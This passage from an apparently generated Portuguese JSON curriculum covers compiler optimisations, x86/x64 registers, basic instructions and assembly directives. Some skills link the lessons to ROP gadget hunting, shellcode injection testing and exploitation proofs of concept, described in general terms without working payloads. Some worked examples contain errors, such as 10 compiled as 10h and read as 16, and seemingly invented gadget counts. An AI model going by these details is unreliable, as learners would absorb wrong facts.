                                    "Atribuir otimizações do linker a compiler",
                                    "Ignorar impactos de LTO",
                                    "Não diferenciar otimizações nível 1 vs 3"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Relacionar Otimizações com Exploração de Shellcode e ROP",
                                  "subSteps": [
                                    "Examine gadgets ROP em regiões otimizadas: busque pop/ret, mov reg/mem chains.",
                                    "Teste injeção de shellcode: verifique se otimizações criam 'no-ops' ou alignments ruins.",
                                    "Simule exploração: use ROPgadget ou rp++ para listar chains afetadas por otimizações.",
                                    "Analise impactos em syscalls: otimizações podem expor ou esconder syscalls diretas.",
                                    "Documente como otimizações dificultam/favorecem bypasses (ex: menos gadgets em código morto removido)."
                                  ],
                                  "verification": "Relatório de exploração com chains ROP viáveis em O0 vs O3, incluindo PoC script.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "ROPgadget/rp++ tools",
                                    "pwndbg ou GDB",
                                    "Binários analisados"
                                  ],
                                  "tips": "Compile com -O3 para simular binários reais de produção; teste em ASLR off.",
                                  "learningObjective": "Avaliar implicações de segurança de otimizações em binários vulneráveis.",
                                  "commonMistakes": [
                                    "Testar apenas em código não-vulnerável",
                                    "Ignorar mitigações como CFI",
                                    "Não validar chains em runtime"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'int main() { syscall(SYS_write,1,\"hello\",5); }' com -O0 e -O3. Em -O0, veja call longa; em -O3, syscall direta via rax. Identifique gadgets extras em O0 (mais pop/ret) vs O3 (código mais denso, menos gadgets). Use ROPgadget para confirmar: O0 tem 50+ chains, O3 tem 20.",
                              "finalVerifications": [
                                "Identifica corretamente 5 padrões otimizados em disassembly.",
                                "Compara tamanhos e instruções de binários O0 vs O3 com >80% precisão.",
                                "Lista gadgets ROP impactados por otimizações.",
                                "Explica verbalmente relação syscall otimizada com shellcode injection.",
                                "Gera relatório com offsets e screenshots válidos.",
                                "Simula exploração bem-sucedida em pelo menos um binário."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de padrões (90%+ acertos).",
                                "Profundidade da análise comparativa (cobertura de syscalls/memória).",
                                "Qualidade do relatório (clareza, evidências visuais).",
                                "Compreensão de implicações para ROP/shellcode (explicação coerente).",
                                "Criatividade em conexões reais (ex: malware obfuscado).",
                                "Eficiência temporal (conclusão dentro de estimados)."
                              ],
                              "crossCurricularConnections": [
                                "Linguagens Assembly: Interpretação de instruções otimizadas.",
                                "Compiladores: Entendimento de passes de otimização (GCC/Clang).",
                                "Engenharia Reversa: Técnicas de análise estática/dinâmica.",
                                "Exploração de Vulnerabilidades: ROP chains e shellcode crafting.",
                                "Sistemas Operacionais: Syscalls em ELF/PE."
                              ],
                              "realWorldApplication": "Em análise de malware reverso, pentests e CTFs, otimizações alteram binários de produção, afetando detecção de exploits; pentesters usam isso para craftar ROP mais stealth em software otimizado como browsers ou servers."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.3.4",
                            "name": "Comparar código com e sem otimizações",
                            "description": "Compilar código com flags -O0 vs -O3, disassemblar e comparar diferenças em controle de fluxo, preparando para engenharia reversa e injeção de código arbitrário.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar e compilar código fonte sem otimizações (-O0)",
                                  "subSteps": [
                                    "Selecione ou escreva um código C simples com estruturas de controle de fluxo claras, como loops e condicionais (ex: soma em loop de 1 a 100).",
                                    "Instale o GCC em seu ambiente Linux (use 'sudo apt install gcc' no Ubuntu).",
                                    "Compile o código com a flag -O0: 'gcc -O0 -g -o programa_unopt source.c' (inclua -g para debug info).",
                                    "Verifique o executável gerado com 'ls -la programa_unopt' e execute-o para confirmar funcionalidade.",
                                    "Anote o tamanho do binário para comparação futura."
                                  ],
                                  "verification": "Confirme que o binário foi gerado sem erros, executa corretamente e possui símbolos de debug via 'objdump -t programa_unopt'.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GCC instalado",
                                    "Editor de texto (VS Code ou vim)",
                                    "Código fonte C simples",
                                    "Terminal Linux"
                                  ],
                                  "tips": "Use um código com loops desnecessariamente ineficientes para maximizar diferenças visíveis.",
                                  "learningObjective": "Entender como compilar código desotimizado para preservar estruturas originais de controle de fluxo.",
                                  "commonMistakes": [
                                    "Esquecer a flag -g, perdendo símbolos para análise posterior",
                                    "Compilar com otimizações padrão do GCC (-O2 implícito)",
                                    "Não testar execução do binário"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compilar o mesmo código com otimizações agressivas (-O3)",
                                  "subSteps": [
                                    "Use o mesmo código fonte do Step 1.",
                                    "Compile com flag -O3: 'gcc -O3 -g -o programa_opt source.c'.",
                                    "Verifique o executável gerado e execute-o para confirmar que produz o mesmo resultado que a versão -O0.",
                                    "Compare tamanhos dos binários com 'ls -la programa_unopt programa_opt'.",
                                    "Note qualquer aviso do compilador sobre otimizações aplicadas."
                                  ],
                                  "verification": "Binário otimizado executa corretamente, é menor em tamanho e 'objdump -t programa_opt' mostra menos instruções simbólicas.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Mesmo código fonte",
                                    "GCC",
                                    "Terminal"
                                  ],
                                  "tips": "A flag -O3 aplica otimizações como unrolling de loops e eliminação de código morto.",
                                  "learningObjective": "Compreender o impacto das otimizações de alto nível no tamanho e estrutura do binário.",
                                  "commonMistakes": [
                                    "Não incluir -g, dificultando disassemble com símbolos",
                                    "Ignorar diferenças de tamanho/performance",
                                    "Executar em máquina sem suporte a otimizações vetoriais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Disassemblar ambos os binários para inspeção",
                                  "subSteps": [
                                    "Instale objdump se necessário ('sudo apt install binutils').",
                                    "Gere disassembly da versão -O0: 'objdump -d -M intel programa_unopt > unopt_asm.txt'.",
                                    "Gere disassembly da versão -O3: 'objdump -d -M intel programa_opt > opt_asm.txt'.",
                                    "Abra os arquivos em um editor e localize seções de código relevantes (busque por funções principais).",
                                    "Use GDB para inspeção interativa: 'gdb programa_unopt' e 'disassemble main'."
                                  ],
                                  "verification": "Arquivos de assembly gerados corretamente, com instruções x86/x64 legíveis e funções identificáveis.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "binutils/objdump",
                                    "GDB",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use -M intel para sintaxe Intel mais legível; foque na seção .text.",
                                  "learningObjective": "Aprender a extrair e interpretar código assembly de binários compilados.",
                                  "commonMistakes": [
                                    "Usar objdump sem -d (desmontagem)",
                                    "Não especificar arquitetura (-M), gerando sintaxe AT&T confusa",
                                    "Analisar seções erradas como .data"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar diferenças no controle de fluxo entre assemblys",
                                  "subSteps": [
                                    "Abra ambos os arquivos de assembly lado a lado.",
                                    "Identifique estruturas de controle: loops (jmp condicionais), ifs (cmov ou branches).",
                                    "Compare: na -O0, loops são literais (inc, cmp, jmp); na -O3, otimizados (unroll, soma direta).",
                                    "Anote diferenças específicas: número de instruções, branches eliminados, registro alocação.",
                                    "Discuta implicações para reverse engineering: otimizações obfuscam lógica original."
                                  ],
                                  "verification": "Relatório escrito listando 5+ diferenças concretas em controle de fluxo, com linhas de assembly citadas.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Arquivos asm gerados",
                                    "Editor com split view (ex: VS Code)"
                                  ],
                                  "tips": "Use diff tool: 'diff unopt_asm.txt opt_asm.txt | less' para destaques iniciais.",
                                  "learningObjective": "Analisar como otimizações alteram fluxo de controle, preparando para RE e injeções.",
                                  "commonMistakes": [
                                    "Focar só em tamanho, ignorando fluxo",
                                    "Não mapear lógica C para assembly",
                                    "Confundir otimizações com bugs"
                                  ]
                                }
                              ],
                              "practicalExample": "Escreva um programa C 'soma.c' com loop for(int i=0; i<100; i++) sum += i;. Compile: gcc -O0 -o soma_o0 soma.c e gcc -O3 -o soma_o3 soma.c. Disassemble: objdump -d soma_o0 mostra ~50 instruções no loop (mov, add, cmp, jne); soma_o3 otimiza para soma direta (sum = 4950) sem loop, eliminando branches.",
                              "finalVerifications": [
                                "Compila e executa binários -O0 e -O3 com saídas idênticas.",
                                "Gera disassemblies válidos e identifica pelo menos 3 diferenças em controle de fluxo.",
                                "Explica verbalmente como -O3 remove branches condicionais desnecessários.",
                                "Produz relatório comparativo com citações de assembly.",
                                "Demonstra uso de GDB para step-through em assembly otimizado vs desotimizado.",
                                "Discute riscos de injeção de código em binários otimizados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na compilação e disassemble (sem erros de flags/sintaxe).",
                                "Profundidade da comparação: ≥5 diferenças específicas em fluxo anotadas.",
                                "Correta interpretação de otimizações (ex: loop unrolling, dead code elimination).",
                                "Clareza no relatório: mapeamento lógico C → assembly.",
                                "Compreensão contextual: ligação com RE e segurança.",
                                "Eficiência temporal: completa em <2h."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender impacto de compiladores em código fonte.",
                                "Arquitetura de Computadores: Análise de instruções x86 e pipeline effects.",
                                "Engenharia Reversa: Base para ferramentas como IDA Pro/Ghidra.",
                                "Segurança de Software: Otimizações como ofuscação natural contra análise.",
                                "Performance Engineering: Métricas de otimização além de velocidade."
                              ],
                              "realWorldApplication": "Em auditorias de segurança e pentests, comparar binários otimizados vs desotimizados revela vulnerabilidades ocultas por otimizações (ex: ROP chains alteradas), facilita engenharia reversa de malwares compilados com -O3 e prepara para injeções precisas em fluxos de controle modificados."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.2",
                    "name": "Geração de Código Assembly",
                    "description": "Transformação de código fonte ou intermediário em instruções assembly legíveis.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.2.1.1",
                        "name": "Conceitos Fundamentais de Código Assembly",
                        "description": "Elementos básicos do código assembly gerado por compiladores, incluindo registradores, instruções primitivas, diretivas e estrutura de um programa assembly legível.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.1.1.1",
                            "name": "Identificar registradores principais em x86 e x64",
                            "description": "Reconhecer e descrever registradores como EAX/RAX, EBX/RBX, ESP/RSP e seus papéis na geração de código assembly a partir de operações aritméticas e lógicas simples.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a arquitetura de registradores em x86 (32-bit)",
                                  "subSteps": [
                                    "Estude a hierarquia de registradores: 8-bit (AL, AH), 16-bit (AX), 32-bit (EAX).",
                                    "Identifique registradores de uso geral: EAX, EBX, ECX, EDX.",
                                    "Aprenda o registrador de pilha: ESP e sua função como ponteiro de pilha.",
                                    "Revise registradores de segmento básicos (CS, DS, SS, ES) e seu papel contextual.",
                                    "Anote diferenças entre registradores de propósito geral e especiais."
                                  ],
                                  "verification": "Liste corretamente os 4 registradores de uso geral de 32-bit e descreva ESP em uma frase.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86 Manuals (Vol. 1)",
                                    "Ferramenta online Godbolt Compiler Explorer"
                                  ],
                                  "tips": "Use diagramas visuais para mapear tamanhos de registradores (ex: EAX contém AX, que contém AL/AH).",
                                  "learningObjective": "Reconhecer a estrutura e nomenclatura básica dos registradores x86 32-bit.",
                                  "commonMistakes": [
                                    "Confundir registradores de 8-bit com 32-bit",
                                    "Ignorar a sobreposição de bytes em registradores maiores"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar extensões para x86-64 (64-bit)",
                                  "subSteps": [
                                    "Identifique extensões: RAX, RBX, RCX, RDX (64-bit) e RSP (stack pointer 64-bit).",
                                    "Aprenda registradores adicionais: R8-R15.",
                                    "Estude acessos parciais: RAX permite acesso a EAX, AX, AL sem overhead.",
                                    "Compare ESP/RSP: RSP gerencia pilhas maiores em 64-bit.",
                                    "Pratique notação: R para 64-bit, E para 32-bit."
                                  ],
                                  "verification": "Desenhe uma tabela comparando EAX/RAX, EBX/RBX, ESP/RSP com tamanhos e usos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Intel 64 and IA-32 Architectures Software Developer Manual",
                                    "Exemplos de assembly em NASM ou GAS"
                                  ],
                                  "tips": "Lembre-se: x64 mantém compatibilidade retroativa, então EAX ainda funciona dentro de RAX.",
                                  "learningObjective": "Diferenciar registradores x86 de x64 e entender extensões de tamanho.",
                                  "commonMistakes": [
                                    "Assumir que x64 remove registradores 32-bit",
                                    "Confundir RSP com RIP (instruction pointer)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar papéis em operações aritméticas e lógicas",
                                  "subSteps": [
                                    "EAX/RAX como acumulador padrão para ADD, SUB, MUL, DIV.",
                                    "EBX/RBX para armazenamento temporário de operandos.",
                                    "ECX/RCX como contador em loops (LOOP) e shifts.",
                                    "EDX/RDX auxiliar em multiplicação/divisão (DX para 32-bit remainder).",
                                    "ESP/RSP: ajustes com PUSH/POP em chamadas de função."
                                  ],
                                  "verification": "Explique o papel de EAX em 'add eax, ebx' e como RSP muda em 'push eax'.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Compiler Explorer (godbolt.org) para gerar assembly de C simples",
                                    "Simulador de CPU como emu8086"
                                  ],
                                  "tips": "Compile código C como 'int a=1; a+=2;' e observe uso de EAX.",
                                  "learningObjective": "Associar registradores a instruções aritméticas/lógicas comuns.",
                                  "commonMistakes": [
                                    "Pensar que qualquer registrador pode ser acumulador",
                                    "Esquecer EDX em operações de 64-bit simuladas em 32-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar identificação em código assembly gerado",
                                  "subSteps": [
                                    "Compile 3-5 snippets C simples (soma, loop, função) para x86 e x64.",
                                    "Identifique registradores em instruções como MOV, ADD, CMP.",
                                    "Trace mudanças em ESP/RSP durante chamadas.",
                                    "Compare saídas x86 vs x64 no Godbolt.",
                                    "Crie um cheat sheet com mapeamentos observados."
                                  ],
                                  "verification": "Analise um assembly fornecido e liste todos os registradores principais usados com seus papéis.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Godbolt.org",
                                    "Editor de texto para snippets C",
                                    "Ferramenta objdump ou IDA Free para binários"
                                  ],
                                  "tips": "Use flags -O0 para código sem otimizações e ver registradores crus.",
                                  "learningObjective": "Identificar e descrever uso de registradores em assembly real.",
                                  "commonMistakes": [
                                    "Ignorar otimizações que remapeiam registradores",
                                    "Não diferenciar x86 de x64 na análise"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile o código C 'int main() { int a=5, b=3; int c = a + b; return c; }' com gcc -m32 (x86) e -m64 (x64). No assembly x86, observe 'mov eax, 5; add eax, 3' usando EAX como acumulador e ESP para setup de stack. Em x64, veja RAX e RSP.",
                              "finalVerifications": [
                                "Liste corretamente EAX/RAX, EBX/RBX, ESP/RSP com tamanhos e propósitos.",
                                "Explique papel de ECX em shifts e loops.",
                                "Identifique registradores em um snippet assembly de 10 linhas.",
                                "Compare uso de stack pointer em x86 vs x64.",
                                "Descreva como EDX auxilia MUL em 32-bit.",
                                "Trace registradores em uma função simples com parâmetros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na nomenclatura e tamanhos de registradores (90% correto).",
                                "Correta associação de registradores a operações aritméticas/lógicas.",
                                "Capacidade de analisar assembly gerado e identificar usos.",
                                "Diferenciação clara entre x86 e x64.",
                                "Explicações concisas e sem erros comuns de confusão.",
                                "Uso de exemplos práticos na descrição."
                              ],
                              "crossCurricularConnections": [
                                "Programação de Sistemas: Entender calling conventions e passagem de argumentos via registradores.",
                                "Segurança Computacional: Identificar exploits de buffer overflow manipulando ESP/RSP.",
                                "Engenharia de Software: Otimização de código via escolha de registradores.",
                                "Sistemas Operacionais: Gerenciamento de pilha e context switches.",
                                "Análise de Binários: Reverse engineering com ferramentas como Ghidra/IDA."
                              ],
                              "realWorldApplication": "Em análise de malware ou reverse engineering, identificar registradores em assembly permite mapear lógica de shellcodes, detectar ofuscação ou explorar vulnerabilidades como ROP chains manipulando RSP."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.1.2",
                            "name": "Interpretar instruções básicas de movimentação e aritmética",
                            "description": "Analisar instruções como MOV, ADD, SUB e CMP geradas a partir de código fonte C, entendendo como elas representam atribuições e cálculos em assembly legível.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Instruções de Movimentação (MOV)",
                                  "subSteps": [
                                    "Estude a sintaxe básica da instrução MOV: MOV destino, origem (ex: MOV eax, 5)",
                                    "Analise como atribuições simples em C (ex: int x = 5;) geram MOV em assembly",
                                    "Identifique registradores comuns (EAX, EBX, etc.) e memória como operandos",
                                    "Pratique decodificando 3 exemplos de MOV de snippets de C compilados",
                                    "Compare MOV com operações equivalentes em alto nível"
                                  ],
                                  "verification": "Liste corretamente o propósito e operandos de 5 instruções MOV de um listing assembly",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Compilador GCC",
                                    "Editor de texto (VS Code)",
                                    "Exemplos de código C simples"
                                  ],
                                  "tips": "Sempre verifique o tamanho dos operandos (byte, word, dword) para evitar confusões",
                                  "learningObjective": "Explicar como MOV representa atribuições de variáveis em assembly x86",
                                  "commonMistakes": [
                                    "Confundir MOV com cópia física de memória",
                                    "Ignorar flags afetadas (MOV não afeta flags)",
                                    "Assumir que MOV é só para registradores"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Dominar Instruções Aritméticas Básicas (ADD e SUB)",
                                  "subSteps": [
                                    "Aprenda sintaxe: ADD destino, origem e SUB destino, origem",
                                    "Mapeie operações C como x = x + 5; para ADD e x -= 3; para SUB",
                                    "Observe efeitos em flags (ZF, CF, OF) após ADD/SUB",
                                    "Compile e examine assembly de expressões aritméticas simples em C",
                                    "Pratique reescrevendo 4 operações aritméticas de C em assembly equivalente"
                                  ],
                                  "verification": "Traduza corretamente 4 trechos de C com ADD/SUB para assembly e vice-versa",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "GCC com flag -S para gerar .s",
                                    "Documentação Intel x86",
                                    "Calculadora para verificar resultados"
                                  ],
                                  "tips": "Lembre-se: ADD/SUB modificam o destino in-place; teste com valores overflow para ver flags",
                                  "learningObjective": "Interpretar como ADD e SUB implementam cálculos aritméticos de código fonte C",
                                  "commonMistakes": [
                                    "Esquecer que SUB usa borrow (CF)",
                                    "Não notar overflow em operações signed",
                                    "Confundir ordem de operandos (destino primeiro)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Entender Instruções de Comparação (CMP)",
                                  "subSteps": [
                                    "Estude CMP destino, origem: subtrai sem armazenar, só seta flags",
                                    "Relacione com if (x > y) em C, que gera CMP seguido de Jcc",
                                    "Identifique flags setadas: ZF (igual), SF (signed), CF (unsigned menor)",
                                    "Analise assembly gerado de comparações condicionais em C",
                                    "Exercite interpretando 5 sequências CMP + jump de listagens"
                                  ],
                                  "verification": "Explique flags resultantes de 3 exemplos CMP com valores específicos",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Simulador online x86 (ex: godbolt.org)",
                                    "Exemplos de código C com condicionais"
                                  ],
                                  "tips": "CMP é como SUB mas só para flags; sempre pense em branches subsequentes",
                                  "learningObjective": "Reconhecer CMP como base para decisões condicionais em assembly de C",
                                  "commonMistakes": [
                                    "Pensar que CMP armazena resultado",
                                    "Ignorar diferenças signed vs unsigned em flags",
                                    "Confundir CMP com TEST"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar Sequências Combinadas de Instruções",
                                  "subSteps": [
                                    "Compile um programa C simples com atribuições, cálculos e ifs",
                                    "Trace o fluxo: identifique MOV para init, ADD/SUB para ops, CMP para conds",
                                    "Anote equivalências linha por linha entre C e assembly",
                                    "Simule execução passo a passo com valores de exemplo",
                                    "Crie um diagrama de fluxo mostrando como instruções formam lógica C"
                                  ],
                                  "verification": "Interprete completamente um snippet assembly de 10 linhas equivalente a C",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Godbolt.org para C -> assembly",
                                    "Papel e caneta para diagramas",
                                    "Debugger GDB básico"
                                  ],
                                  "tips": "Comece do topo; correlacione registradores com variáveis C via símbolos",
                                  "learningObjective": "Analisar blocos assembly como representações de estruturas C",
                                  "commonMistakes": [
                                    "Perder o rastreamento de registradores entre instruções",
                                    "Ignorar otimizações do compilador",
                                    "Não considerar contexto de pilha"
                                  ]
                                }
                              ],
                              "practicalExample": "Código C: int x = 10; x += 5; if (x > 12) { x -= 3; } Assembly gerado: MOV eax, 10h; ADD eax, 5; CMP eax, 0Ch; JG label; SUB eax, 3; label: ... Interpretação: Inicializa x=16 (10h=16), compara >12, salta se true para subtrair 3.",
                              "finalVerifications": [
                                "Traduza 5 linhas de assembly MOV/ADD/SUB/CMP para pseudocódigo C",
                                "Simule execução de um bloco assembly com entradas variáveis",
                                "Identifique flags corretas após CMP em 4 cenários",
                                "Explique discrepâncias entre C otimizado e assembly gerado",
                                "Crie um programa C que gere exatamente uma sequência alvo de assembly"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de operandos e efeitos de instruções (90%+ correto)",
                                "Correta correlação entre lógica C e assembly (incluindo flags e fluxo)",
                                "Capacidade de simular execução sem erros de rastreamento",
                                "Uso correto de terminologia x86 (registradores, flags)",
                                "Criatividade em exemplos práticos e detecção de erros comuns"
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Operações aritméticas e lógica de comparação (álgebra booleana)",
                                "Programação: Ponte entre alto nível (C) e baixo nível (assembly)",
                                "Lógica Computacional: Análise de fluxo de controle e flags como bits",
                                "Segurança da Informação: Base para engenharia reversa de binários maliciosos"
                              ],
                              "realWorldApplication": "Em análise de malware, interprete assembly de binários desmontados para entender payloads aritméticos em exploits, como cálculos de chaves em ransomware ou offsets em shellcodes."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.1.3",
                            "name": "Reconhecer diretivas assembly comuns",
                            "description": "Identificar diretivas como .section, .global, .text e .data em arquivos assembly gerados, explicando seu papel na organização do código objeto.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito Geral de Diretivas em Assembly",
                                  "subSteps": [
                                    "Ler a definição de diretivas assembler como instruções para o assembler, não para a CPU.",
                                    "Identificar que diretivas começam com ponto (.) e controlam a geração de código objeto.",
                                    "Diferenciar diretivas de instruções assembly (ex: mov vs .data).",
                                    "Estudar como diretivas organizam o código em seções para o linker.",
                                    "Revisar exemplos básicos de sintaxe em manuais como GAS (GNU Assembler)."
                                  ],
                                  "verification": "Escrever uma definição em 2-3 frases explicando o que são diretivas e sua diferença de instruções.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Manual do GNU Assembler (GAS), editor de texto"
                                  ],
                                  "tips": "Lembre-se: diretivas são 'metainstruções' para o assembler processar antes da CPU.",
                                  "learningObjective": "Diferenciar diretivas de instruções e compreender seu papel na estruturação do objeto.",
                                  "commonMistakes": [
                                    "Confundir diretivas com opcodes da CPU",
                                    "Ignorar o prefixo '.'",
                                    "Pensar que são executáveis em runtime"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Memorizar e Explicar Diretivas Comuns (.section, .global, .text, .data)",
                                  "subSteps": [
                                    "Estudar .global: declara símbolos visíveis fora do arquivo objeto.",
                                    "Analisar .section: inicia uma nova seção personalizada no objeto.",
                                    "Explorar .text: seção padrão para código executável.",
                                    "Detalhar .data: seção para dados inicializados.",
                                    "Mapear o papel de cada uma na organização final do executável (headers ELF/PE)."
                                  ],
                                  "verification": "Listar cada diretiva com uma frase explicando seu propósito e uso típico.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação assembler online, flashcards personalizados"
                                  ],
                                  "tips": "Associe .text a 'texto/código', .data a 'dados constantes' para fixar.",
                                  "learningObjective": "Identificar e descrever precisamente o papel de 4 diretivas comuns.",
                                  "commonMistakes": [
                                    ".global confundido com exportação de funções em C",
                                    ".text vista como strings",
                                    "Ignorar alinhamento em seções"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Diretivas em Arquivos Assembly Reais",
                                  "subSteps": [
                                    "Compilar um programa C simples para assembly (gcc -S).",
                                    "Abrir o arquivo .s e localizar .section, .global, .text, .data.",
                                    "Anotar linhas com cada diretiva e o conteúdo seguinte.",
                                    "Traçar como elas se agrupam em seções no objeto final.",
                                    "Usar objdump -h no binário gerado para correlacionar seções."
                                  ],
                                  "verification": "Marcar todas as diretivas em um snippet assembly e rotulá-las.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GCC instalado, programa C simples, objdump"
                                  ],
                                  "tips": "Use grep '.text' arquivo.s para busca rápida.",
                                  "learningObjective": "Localizar e contextualizar diretivas em código assembly gerado.",
                                  "commonMistakes": [
                                    "Não compilar com -S",
                                    "Confundir labels com diretivas",
                                    "Ignorar diretivas aninhadas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explicar o Impacto na Organização do Código Objeto",
                                  "subSteps": [
                                    "Desenhar um diagrama simples de seções (.text, .data) no formato ELF.",
                                    "Explicar como .global permite linking entre arquivos.",
                                    "Simular o processo: assembler → objeto → linker → executável.",
                                    "Discutir erros comuns como dados em .text (NX bit violado).",
                                    "Testar modificando um .s e recompilando para observar mudanças."
                                  ],
                                  "verification": "Criar um fluxograma mostrando fluxo de diretivas para seções no binário.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de desenho (Draw.io), ld manual"
                                  ],
                                  "tips": "Pense em seções como 'capítulos' do livro objeto.",
                                  "learningObjective": "Relacionar diretivas à estrutura final do código objeto.",
                                  "commonMistakes": [
                                    "Subestimar .section em formatos como Mach-O",
                                    "Confundir .data com .bss",
                                    "Ignorar permissões de seção"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um arquivo main.s gerado por gcc -S de 'int main(){int x=42; return x;}':\n.global main\n.section .text\nmain:\n push %rbp\n ... \n.section .data\n.LC0:\n .long 42\nAqui, .global exporta main, .text contém código, .data armazena 42 inicializado.",
                              "finalVerifications": [
                                "Identificar corretamente .text e .data em um snippet assembly aleatório.",
                                "Explicar o papel de .global em linking multi-arquivo.",
                                "Listar 3 consequências de usar seção errada (ex: dados em .text).",
                                "Usar objdump para mapear seções de um binário simples.",
                                "Diferenciar .section de .text/.data em contextos avançados.",
                                "Desenhar diagrama de seções ELF básico."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de diretivas (100% corretas).",
                                "Explicações claras e concisas do papel organizacional.",
                                "Correta diferenciação entre diretivas e instruções.",
                                "Uso correto de ferramentas como gcc -S e objdump.",
                                "Compreensão de impactos em linking e execução.",
                                "Ausência de confusões comuns como .data vs .bss."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entender layout de memória em ELF/PE.",
                                "Programação em C: Correlacionar variáveis com seções assembly.",
                                "Sistemas Operacionais: Permissões de página (RX para .text).",
                                "Cibersegurança: Análise de binários em reverse engineering.",
                                "Compiladores: Fases de geração de assembly e linking."
                              ],
                              "realWorldApplication": "Em análise forense digital e reverse engineering de malware, profissionais usam objdump ou IDA Pro para identificar seções via diretivas assembly, detectando payloads em .data ou hooks em .text, essencial para desarmar exploits em segurança computacional."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.1.4",
                            "name": "Analisar estrutura de um programa assembly simples",
                            "description": "Descrever a sequência típica de entrada (_start), corpo principal e saída em assembly gerado, correlacionando com fluxos de código fonte.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a estrutura geral de um programa assembly gerado por compilador",
                                  "subSteps": [
                                    "Estude a sintaxe básica de assembly (ex: AT&T ou Intel) usada pelo GCC.",
                                    "Identifique seções comuns: .text (código executável), .data (dados inicializados), .bss (dados não inicializados).",
                                    "Aprenda sobre registradores, instruções básicas (mov, call, ret) e chamadas de sistema (syscall ou int 0x80).",
                                    "Revise o fluxo de execução: do entry point até a saída.",
                                    "Anote diferenças entre assembly manual (NASM) e gerado por compilador."
                                  ],
                                  "verification": "Desenhe um diagrama simples da estrutura de um programa assembly com seções marcadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação GCC (objdump man page)",
                                    "Editor de texto",
                                    "Exemplo de código C simples"
                                  ],
                                  "tips": "Use objdump -d para disassemblar binários e visualizar estrutura.",
                                  "learningObjective": "Reconhecer componentes fundamentais de um executável assembly.",
                                  "commonMistakes": [
                                    "Confundir seções .text com .data",
                                    "Ignorar headers ELF",
                                    "Assumir syntax única sem contexto"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar e analisar o entry point (_start)",
                                  "subSteps": [
                                    "Compile um programa C simples com gcc -S para gerar .s file.",
                                    "Use objdump -d ou grep para encontrar '_start' label.",
                                    "Analise instruções iniciais: setup de stack (mov %rsp, %rbp), argc/argv handling.",
                                    "Correlacione com linker: _start chama main e __libc_start_main.",
                                    "Registre parâmetros passados para main (argc em %edi, argv em %rsi)."
                                  ],
                                  "verification": "Explique em voz alta o que acontece nas primeiras 5 instruções após _start.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
